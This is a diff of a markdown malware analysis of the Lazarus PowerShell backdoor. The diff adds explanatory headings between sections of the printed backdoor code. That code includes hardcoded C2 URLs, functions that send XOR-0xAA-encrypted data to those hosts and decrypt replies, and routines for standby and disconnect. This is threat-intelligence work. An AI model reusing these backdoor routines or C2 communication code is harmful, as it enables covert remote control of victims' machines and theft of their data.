@@ -121,8 +121,7 @@
 ![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_Command.PNG)
 ![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_option.png)
 ### Powershell Backdoor (PowerShell/NukeSped)
-###### Now, see the Windows version, this use Powershell language for the backdoor 
-
+###### Now, see the Windows version, this use Powershell language for the backdoor, the first bloc of the malware is the global values for the configuration, list of URL to contact and control values.
 ``` powershell
 $global:breakvalue=1
 $global:mbz=132608
@@ -130,7 +129,9 @@ $global:tid=0
 $global:url="https://crabbedly.club/board.php","https://craypot.live/board.php","https://indagator.club/board.php"
 $global:nup=0
 $global:nwct=0
-
+``` 
+###### The next bloc content the functions for copy the bytes and convert from different encoding the data.
+``` powershell
 function CopyBytes($DatatoCopy,$dst,$dstOffset)
 {
 	$Bytes=[System.BitConverter]::GetBytes($DatatoCopy)
@@ -143,6 +144,9 @@ function CopyBytes_UTF8($DatatoCopy,$dst,$dstOffset)
 }
 function ConverttoInt32($buffer,$Offset){ return [System.BitConverter]::ToInt32($buffer,$Offset) }
 function Get_UTF8Bytes($Data){ return [System.Text.ASCIIEncoding]::UTF8.GetBytes($Data) }
+``` 
+###### The following functions are for send and get the data from the C2. We can note that the user agent is the same that the MacOS backdoor.
+``` powershell
 function senddata($tid,$rid,$array_data,$DatatoC2_Length,$url)
 {
 	try
@@ -175,11 +179,7 @@ function senddata($tid,$rid,$array_data,$DatatoC2_Length,$url)
 	}
 	catch{return $null}
 }
-function PushDatatoC2($tid,$rid,$bd,$DatatoC2_Length,$url)
-{
-	if($DatatoC2_Length -gt 0){ for($i=0;$i -lt $DatatoC2_Length; $i++){$bd[$i]=$bd[$i] -bxor 0xAA} }
-	return senddata $tid $rid $bd $DatatoC2_Length $url
-}
+
 function GetResponseC2($netobject,$mxz)
 {
 	try
@@ -216,12 +216,23 @@ function GetResponseC2($netobject,$mxz)
 	}
 	catch{return $null}
 }
+```
+###### The both next functions use the same XOR value ```"0xAA"``` for encryt and decrypt data from the C2. We can note again that the same XOR value that in the MacOS backdoor.
+``` powershell
+function PushDatatoC2($tid,$rid,$bd,$DatatoC2_Length,$url)
+{
+	if($DatatoC2_Length -gt 0){ for($i=0;$i -lt $DatatoC2_Length; $i++){$bd[$i]=$bd[$i] -bxor 0xAA} }
+	return senddata $tid $rid $bd $DatatoC2_Length $url
+}
 function DecryptC2Data($netobject,$mxz)
 {
 	$DataC2=GetResponseC2 $netobject $mxz
 	if($DataC2 -ne $null){for($i=0; $i -lt $DataC2.length; $i++){ $DataC2[$i] = $DataC2[$i] -bxor 0xAA }}
 	return $DataC2
 }
+```
+###### Like the MacOS backdoor, we observe that the back have multiple mods for communicate with the C2 and depends of the initial reply of the C2.
+``` powershell
 function updatemod1()
 {
 	$trigger=0
@@ -280,6 +291,9 @@ function updatemod3($nmsg)
 	} while($false)
 	return $trigger
 }
+```
+###### This have the possiblity to set in standby the backdoor and to close the session.
+``` powershell
 function slp($buf)
 {
 	$trigger=0
@@ -305,6 +319,9 @@ function disconnect()
 	} while($false)
 	return $trigger
 }
+```
+
+``` powershell
 function Set-SysInfo()
 {
 	$trigger=0
